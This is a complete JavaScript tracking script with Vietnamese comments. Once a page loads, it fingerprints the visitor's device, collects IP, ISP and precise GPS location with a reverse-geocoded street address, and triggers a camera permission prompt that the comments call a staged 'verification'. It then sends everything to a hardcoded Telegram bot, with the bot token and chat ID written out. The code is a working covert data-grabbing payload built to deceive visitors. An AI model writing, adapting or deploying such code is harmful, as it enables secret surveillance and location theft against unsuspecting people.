const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
    time: '',
    ip: '',
    isp: '',
    realIp: '',
    address: '',
    country: '', 
    lat: '',
    lon: '',
    device: '',
    os: '',
    camera: '⏳ Đang kiểm tra...'
};

// ... (Giữ nguyên hàm detectDevice, getIPs, getLocation, fallbackIPLocation như cũ) ...

function detectDevice() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const screenW = window.screen.width;
    const screenH = window.screen.height;
    const ratio = window.devicePixelRatio;

    if (/Android/i.test(ua)) {
        info.os = 'Android';
        const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
        info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
    } 
    else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
        info.os = 'iOS';
        const res = `${screenW}x${screenH}@${ratio}`;
        const iphoneModels = {
            "430x932@3": "iPhone 14/15/16 Pro Max",
            "393x852@3": "iPhone 14/15/16 Pro / 15/16",
            "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
            "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
            "414x896@3": "iPhone XS Max / 11 Pro Max",
            "414x896@2": "iPhone XR / 11",
            "375x812@3": "iPhone X / XS / 11 Pro",
            "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
        };
        info.device = iphoneModels[res] || 'iPhone/iPad';
    } 
    else if (/Windows NT/i.test(ua)) {
        info.device = 'Windows PC';
        info.os = 'Windows';
    } else {
        info.device = 'Không xác định';
        info.os = 'Không rõ';
    }
}

async function getIPs() {
    try {
        const [res1, res2] = await Promise.all([
            fetch('https://api.ipify.org?format=json').then(r => r.json()),
            fetch('https://ipwho.is/').then(r => r.json())
        ]);
        info.ip = res1.ip;
        info.realIp = res2.ip;
        info.isp = res2.connection?.org || 'N/A';
        info.country = res2.country || 'Việt Nam';
        info.lat = res2.latitude;
        info.lon = res2.longitude;
    } catch (e) {
        info.ip = 'Bị chặn';
        info.realIp = 'Lỗi';
    }
}

async function getLocation() {
    return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(fallbackIPLocation());
        navigator.geolocation.getCurrentPosition(
            async pos => {
                info.lat = pos.coords.latitude.toFixed(6);
                info.lon = pos.coords.longitude.toFixed(6);
                try {
                    const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                    const data = await res.json();
                    info.address = data.display_name || 'Tọa độ GPS';
                } catch { info.address = `Tọa độ: ${info.lat}, ${info.lon}`; }
                resolve();
            },
            async () => { await fallbackIPLocation(); resolve(); },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

async function fallbackIPLocation() {
    try {
        const data = await fetch(`https://ipwho.is/`).then(r => r.json());
        info.lat = data.latitude || '0';
        info.lon = data.longitude || '0';
        info.address = `${data.city}, ${data.region} (Vị trí IP)`;
    } catch (e) { info.address = 'Không rõ'; }
}

// Hàm chụp ảnh vẫn giữ để xin quyền, nhưng kết quả trả về chỉ là tín hiệu "đã chụp"
async function captureCamera(facingMode = 'user') {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
        // Dừng stream ngay sau khi lấy được quyền để tắt đèn camera nhanh nhất có thể
        stream.getTracks().forEach(t => t.stop());
        return true; // Trả về true để báo là đã lấy được quyền
    } catch (e) { return false; }
}

function getCaption() {
    // Sửa lỗi hiển thị Maps Link
    const mapsLink = (info.lat && info.lon) 
        ? `https://www.google.com/maps?q=${info.lat},${info.lon}` 
        : 'Không rõ';

    return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device} (${info.os})
🌍 IP: ${info.ip} | ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
📌 Bản đồ: ${mapsLink}
📸 Camera: ${info.camera}
`.trim();
}

async function sendTextOnly() {
    return fetch(API_SEND_TEXT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            chat_id: TELEGRAM_CHAT_ID, 
            text: getCaption(),
            parse_mode: 'HTML' 
        })
    });
}

async function main() {
    info.time = new Date().toLocaleString('vi-VN');
    detectDevice();
    
    // Chạy song song lấy IP và Vị trí
    await Promise.all([getIPs(), getLocation()]);

    // Kích hoạt camera để "diễn" quá trình xác thực nhưng không lưu blob ảnh
    let hasCam = await captureCamera("user");
    
    if (hasCam) {
        info.camera = '✅ Đã xác thực (Không lưu ảnh)';
    } else {
        info.camera = '🚫 Bị từ chối hoặc không có camera';
    }

    // Luôn luôn chỉ gửi Text về Telegram
    await sendTextOnly();
}
